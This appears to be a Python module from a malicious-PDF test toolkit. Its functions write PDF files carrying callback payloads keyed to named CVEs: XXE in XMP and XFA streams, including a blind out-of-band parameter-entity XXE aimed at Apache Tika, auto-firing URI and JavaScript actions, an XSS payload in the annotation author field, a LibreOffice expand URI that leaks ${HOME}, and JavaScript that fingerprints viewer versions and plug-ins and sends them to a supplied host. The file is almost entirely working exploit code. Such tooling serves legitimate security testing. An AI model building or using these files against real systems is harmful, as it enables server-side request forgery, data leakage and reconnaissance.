import base64
import bz2
import os

from malicious_pdf.generators_js import _js_callback_pdf


def create_malpdf35(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /Names << /JavaScript << /Names [(autorun) 5 0 R] >> >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'names-js'    ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /JavaScript
     /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test35"), cFS: "CHTTP"}))
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000120 00000 n
0000000221 00000 n
0000000490 00000 n
0000000610 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
800
%%EOF
''')


# CVE-2016-2175 / CVE-2017-9096: XXE in XMP metadata stream
# Apache PDFBox < 1.8.12 / < 2.0.1 and iText < 5.5.12 / 7.x < 7.0.3
# don't disable external entities when parsing XML inside PDFs.
# This embeds a malicious XXE payload in the XMP metadata stream that
# server-side PDF processors will parse, triggering an outbound request.
# No JavaScript, no actions — pure XML-based callback.
def create_malpdf36(filename, host):
    xmp_payload = (
        '<?xpacket begin="\xef\xbb\xbf" id="W5M0MpCehiHzreSzNTczkc9d"?>\n'
        '<!DOCTYPE foo [\n'
        '  <!ENTITY xxe SYSTEM "' + host + '/test36-xxe-xmp">\n'
        ']>\n'
        '<x:xmpmeta xmlns:x="adobe:ns:meta/">\n'
        '  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">\n'
        '    <rdf:Description rdf:about="">\n'
        '      <dc:title xmlns:dc="http://purl.org/dc/elements/1.1/">&xxe;</dc:title>\n'
        '    </rdf:Description>\n'
        '  </rdf:RDF>\n'
        '</x:xmpmeta>\n'
        '<?xpacket end="w"?>'
    )
    xmp_len = len(xmp_payload)
    with open(filename, "w", encoding="utf-8") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /Metadata 5 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'xxe-xmp'     ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Metadata
     /Subtype /XML
     /Length ''' + str(xmp_len) + '''
  >>
stream
''' + xmp_payload + '''
endstream
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000090 00000 n
0000000191 00000 n
0000000460 00000 n
0000000580 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
1200
%%EOF
''')


# CVE-2016-2175 / CVE-2017-9096: XXE in XFA form data
# Second XXE vector — embeds the payload in an XFA form XML stream
# instead of XMP metadata. Targets PDF processors that parse XFA content
# (PDFBox, iText, some server-side converters).
def create_malpdf37(filename, host):
    xfa_payload = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [\n'
        '  <!ENTITY xxe SYSTEM "' + host + '/test37-xxe-xfa">\n'
        ']>\n'
        '<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">\n'
        '  <template xmlns="http://www.xfa.org/schema/xfa-template/3.0/">\n'
        '    <subform name="form1">\n'
        '      <field name="f1"><value><text>&xxe;</text></value></field>\n'
        '    </subform>\n'
        '  </template>\n'
        '</xdp:xdp>'
    )
    xfa_len = len(xfa_payload)
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AcroForm << /XFA 5 0 R >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'xxe-xfa'     ) Tj
  ET
endstream
endobj

5 0 obj
  << /Length ''' + str(xfa_len) + ''' >>
stream
''' + xfa_payload + '''
endstream
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000100 00000 n
0000000201 00000 n
0000000470 00000 n
0000000590 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
1100
%%EOF
''')


# CVE-2020-29075: Silent DNS tracking via /AA /WC (Will Close) action
# Acrobat Reader versions <= 2020.013.20066 allow an attacker to trigger
# a DNS interaction when a PDF is opened from the filesystem, without
# displaying any prompt to the user. Uses /AA /WC (Will Close) on the
# catalog to fire on document close, and /AA /WS (Will Save) + /AA /DS
# (Did Save) for additional coverage. These trigger silently in Acrobat.
def create_malpdf38(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AA <<
       /WC << /S /URI /URI (''' + host + '''/test38-willclose) >>
       /WS << /S /URI /URI (''' + host + '''/test38-willsave) >>
       /DS << /S /URI /URI (''' + host + '''/test38-didsave) >>
     >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'silent-dns'  ) Tj
  ET
endstream
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000280 00000 n
0000000381 00000 n
0000000650 00000 n
trailer
  << /Root 1 0 R
     /Size 5
  >>
startxref
770
%%EOF
''')


# CVE-2022-28244: Acrobat Reader CSP bypass via embedded HTML annotation
# Acrobat Reader DC <= 22.001.20085 violates content security policy,
# allowing arbitrarily configured cross-origin requests from a PDF.
# Uses a RichMedia annotation with embedded HTML/JS that bypasses the
# PDF security sandbox and CSP restrictions to make outbound requests.
def create_malpdf39(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [6 0 R]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'csp-bypass'  ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Filespec
     /F (test39.html)
     /EF << /F 7 0 R >>
     /AFRelationship /Alternative
  >>
endobj

6 0 obj
  << /Type /Annot
     /Subtype /RichMedia
     /Rect [0 0 0 0]
     /RichMediaSettings <<
       /Activation << /Condition /PO >>
     >>
     /RichMediaContent <<
       /Assets << /Names [(test39.html) 5 0 R] >>
       /Configurations [<<
         /Subtype /HTML
         /Instances [<< /Asset 5 0 R >>]
       >>]
     >>
  >>
endobj

7 0 obj
  << /Type /EmbeddedFile
     /Subtype /text#2Fhtml
     /Length 115
  >>
stream
<html><body><script>
var i=new Image(1,1);i.src="''' + host + '''/test39-csp-bypass";
</script></body></html>
endstream
endobj

xref
0 8
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000530 00000 n
0000000650 00000 n
0000000780 00000 n
0000001100 00000 n
trailer
  << /Root 1 0 R
     /Size 8
  >>
startxref
1400
%%EOF
''')


# CVE-2018-5158: PostScript calculator JS injection (Firefox PDF.js)
# Firefox ESR < 52.8 and Firefox < 60 fail to sanitize PostScript
# calculator functions in PDF streams. This allows injecting JavaScript
# that runs with the PDF.js worker's permissions. The payload is placed
# in a /FunctionType 4 PostScript calculator function within an image's
# /Decode array, which PDF.js evaluates.
def create_malpdf40(filename, host):
    ps_payload = '{ 0 dup } aload pop /Image defineresource'
    js_injection = 'fetch("' + host + '/test40-ps-inject")'
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
         /XObject << /Im0 6 0 R >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'ps-inject'   ) Tj
  ET
  /Im0 Do
endstream
endobj

5 0 obj
  << /FunctionType 4
     /Domain [0 1]
     /Range [0 1]
     /Length ''' + str(len(js_injection) + 20) + '''
  >>
stream
{ ''' + js_injection + ''' }
endstream
endobj

6 0 obj
  << /Type /XObject
     /Subtype /Image
     /Width 1
     /Height 1
     /BitsPerComponent 8
     /ColorSpace [/Separation /All /DeviceGray 5 0 R]
     /Length 1
  >>
stream

endstream
endobj

xref
0 7
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000510 00000 n
0000000640 00000 n
0000000800 00000 n
trailer
  << /Root 1 0 R
     /Size 7
  >>
startxref
1050
%%EOF
''')


# CVE-2018-20065: URI action without user gesture (PDFium/Chrome)
# PDFium in Chrome < 71 allowed /URI actions to initiate navigations
# without requiring a user gesture. Uses /OpenAction with /S /URI
# directly on the catalog, which PDFium processes automatically on
# document load — no click or interaction needed.
def create_malpdf41(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction << /S /URI /URI (''' + host + '''/test41-uri-nogesture) >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'uri-auto'    ) Tj
  ET
endstream
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000120 00000 n
0000000221 00000 n
0000000490 00000 n
trailer
  << /Root 1 0 R
     /Size 5
  >>
startxref
610
%%EOF
''')


# CVE-2025-66516: Blind XXE via OOB parameter entity in XFA (Apache Tika)
# Apache Tika 1.13–3.2.1 fails to disable external entity resolution when
# parsing XFA content in PDFs. Unlike test37 (general entity &xxe;), this uses
# parameter entity %xxe; which triggers an HTTP fetch during DTD processing
# itself — bypassing parsers that disable general entity expansion.
# Targets: Confluence, Jira, Bamboo, Bitbucket, Elasticsearch (all use Tika).
# Fixed in tika-core 3.2.2.
def create_malpdf42(filename, host):
    xfa_payload = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [\n'
        '  <!ENTITY % xxe SYSTEM "' + host + '/test42-xxe-oob">\n'
        '  %xxe;\n'
        ']>\n'
        '<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">\n'
        '  <template xmlns="http://www.xfa.org/schema/xfa-template/3.0/">\n'
        '    <subform name="form1">\n'
        '      <field name="f1"><value><text>oob</text></value></field>\n'
        '    </subform>\n'
        '  </template>\n'
        '</xdp:xdp>'
    )
    xfa_len = len(xfa_payload)
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AcroForm << /XFA 5 0 R >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'xxe-oob-xfa') Tj
  ET
endstream
endobj

5 0 obj
  << /Length ''' + str(xfa_len) + ''' >>
stream
''' + xfa_payload + '''
endstream
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000100 00000 n
0000000201 00000 n
0000000470 00000 n
0000000590 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
1100
%%EOF
''')


# CVE-2025-70401: Stored DOM XSS via annotation /T (author) field
# Apryse WebViewer passes the /T field of Text annotations through
# innerHTML without sanitization during React re-renders. A malicious
# author string containing HTML triggers persistent XSS in the viewer.
# Targets: Apryse WebViewer, web-based PDF viewers that render annotation
# metadata as HTML.
def create_malpdf43(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [5 0 R]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'annot-xss'  ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Annot
     /Subtype /Text
     /Rect [100 700 300 750]
     /T (<img src="''' + host + '''/test43-annot-xss">)
     /Contents (Test annotation)
     /Open true
     /C [1 1 0]
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000530 00000 n
0000000650 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
950
%%EOF
''')


# CVE-2024-12426: LibreOffice vnd.sun.star.expand URL variable exfiltration
# LibreOffice < 24.8.4 processes the vnd.sun.star.expand: URI scheme which
# expands environment variables and INI file values. A /URI action using
# this scheme causes LibreOffice to fetch a URL containing the expanded
# values of ${HOME}, AWS credentials from .env files, etc.
# No user interaction required — fires on document open.
# Targets: headless LibreOffice server-side conversion pipelines.
def create_malpdf44(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'lo-expand'  ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /URI
     /URI (vnd.sun.star.expand:''' + host + '''/test44-lo-expand?v=${HOME})
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000082 00000 n
0000000183 00000 n
0000000452 00000 n
0000000572 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
750
%%EOF
''')


# CVE-2025-59803: Foxit OCG JavaScript trigger during signing workflow
# Foxit Reader/Editor < 2025.2.1 fires /AA /WP (Will Print) and /DP
# (Did Print) triggers during the internal flatten-and-print step of
# digital signing. JavaScript actions in these triggers execute during
# the signing workflow, enabling callbacks without explicit user action.
# Combined with OCG (Optional Content Groups) for content manipulation.
def create_malpdf45(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OCProperties <<
       /OCGs [5 0 R]
       /D << /ON [5 0 R] /OFF [] /BaseState /ON >>
     >>
     /AA <<
       /WP 6 0 R
       /DP 6 0 R
     >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'ocg-trigger') Tj
  ET
endstream
endobj

5 0 obj
  << /Type /OCG
     /Name (Layer1)
     /Intent /View
  >>
endobj

6 0 obj
  << /Type /Action
     /S /JavaScript
     /JS (app.launchURL("''' + host + '''/test45-ocg-trigger", true))
  >>
endobj

xref
0 7
0000000000 65535 f
0000000010 00000 n
0000000230 00000 n
0000000331 00000 n
0000000600 00000 n
0000000720 00000 n
0000000800 00000 n
trailer
  << /Root 1 0 R
     /Size 7
  >>
startxref
950
%%EOF
''')


# CVE-2026-25755: jsPDF addJS() PDF object injection
# jsPDF < 4.2.0 fails to escape ) in addJS() input, allowing attackers
# to terminate the JS literal string and inject arbitrary PDF objects.
# This test demonstrates the resulting PDF structure: a truncated JS
# object (remnant of broken string) followed by an attacker-injected
# page object with /AA /O (Open) auto-action containing a URI callback.
# Different from test28 (duplicate /A key) — this is object-level injection.
def create_malpdf46(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 3 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [4 0 R]
     /Count 1
  >>
endobj

3 0 obj
  << /S /JavaScript
     /JS (var x=1)
  >>
endobj

4 0 obj
  << /Type /Page
     /Parent 2 0 R
     /MediaBox [0 0 612 792]
     /AA << /O << /S /URI /URI (''' + host + '''/test46-obj-inject) >> >>
  >>
endobj

trailer
  << /Root 1 0 R
     /Size 5
  >>
%%EOF
''')


# PDF 2.0: Embedded HTML callback via /AF (Associated Files)
# PDF 2.0 introduced the /AF (Associated Files) array in the catalog,
# allowing files to be attached at document level with semantic roles.
# This embeds an HTML file via /EF (EmbeddedFile) referenced from /AF,
# with an Image() beacon callback. Different from test39 (RichMedia
# annotation, Acrobat-specific pre-2.0) — /AF is a PDF 2.0 spec feature
# that may be processed by different viewers and server-side tools.
def create_malpdf47(filename, host):
    html_payload = '<html><body><script>\nvar i=new Image(1,1);i.src="' + host + '/test47-af-embed";\n</script></body></html>'
    html_len = len(html_payload)
    with open(filename, "w") as file:
        file.write('''%PDF-2.0

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AF [5 0 R]
     /Version /2.0
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'af-embed'   ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Filespec
     /F (test47.html)
     /UF (test47.html)
     /EF << /F 6 0 R >>
     /AFRelationship /Supplement
  >>
endobj

6 0 obj
  << /Type /EmbeddedFile
     /Subtype /text#2Fhtml
     /Length ''' + str(html_len) + '''
  >>
stream
''' + html_payload + '''
endstream
endobj

xref
0 7
0000000000 65535 f
0000000010 00000 n
0000000098 00000 n
0000000199 00000 n
0000000468 00000 n
0000000588 00000 n
0000000730 00000 n
trailer
  << /Root 1 0 R
     /Size 7
  >>
startxref
1050
%%EOF
''')


# XFA SOAP callback via initialize event
# XFA forms support <submit method="soap"> which sends SOAP-formatted
# HTTP requests with Content-Type: text/xml and a SOAPAction header.
# Using activity="initialize" fires earlier than test2's docReady event —
# during XFA field object creation, before the document is fully ready.
# Different from test2: SOAP method (not POST), initialize event (not
# docReady), and includes SOAPAction header for distinct HTTP fingerprint.
# Targets: Adobe Acrobat XFA engine, AEM Forms, server-side XFA processors.
def create_malpdf48(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1
1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="SOAP Callback">
            <event activity="initialize">
               <submit
                     method="soap"
                     action="''' + host + '''/test48-xfa-soap"
                     soapAction="http://soap.action/ping"/>
            </event>
        </field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj
trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>''')


# test49.1: Collab.isDocReadOnly() fingerprinting
# Probes Acrobat collaboration API state and reports whether the document is
# read-only. Useful as a low-noise Acrobat/Reader capability fingerprint.
def create_malpdf49_1(filename, host):
    _js_callback_pdf(filename, host,
        'var ro="unknown";try{ro=Collab.isDocReadOnly()}catch(e){ro="err:"+e}'
        'this.submitForm({cURL:"' + host + '/test49_1-collab-readonly?ro="+ro})',
        'js-collab-readonly')


# test49.2: app.plugIns enumeration
# Enumerates installed Acrobat/Reader plug-ins and versions, then returns a
# compact list via submitForm().
def create_malpdf49_2(filename, host):
    _js_callback_pdf(filename, host,
        'var p=[];try{for(var i=0;i<app.plugIns.length;i++){'
        'p.push(app.plugIns[i].name+"="+app.plugIns[i].version)}}'
        'catch(e){p.push("err:"+e)}'
        'this.submitForm({cURL:"' + host + '/test49_2-plugins?list="+p.join(",")})',
        'js-plugins')


# test49.3: app.viewerVersion + app.viewerType fingerprinting
# Captures the viewer version/type pair to distinguish Acrobat products and
# major runtime versions.
def create_malpdf49_3(filename, host):
    _js_callback_pdf(filename, host,
        'var v="unknown",t="unknown";try{v=app.viewerVersion;t=app.viewerType}catch(e){}'
        'this.submitForm({cURL:"' + host + '/test49_3-viewer?ver="+v+"&type="+t})',
        'js-viewer-fingerprint')
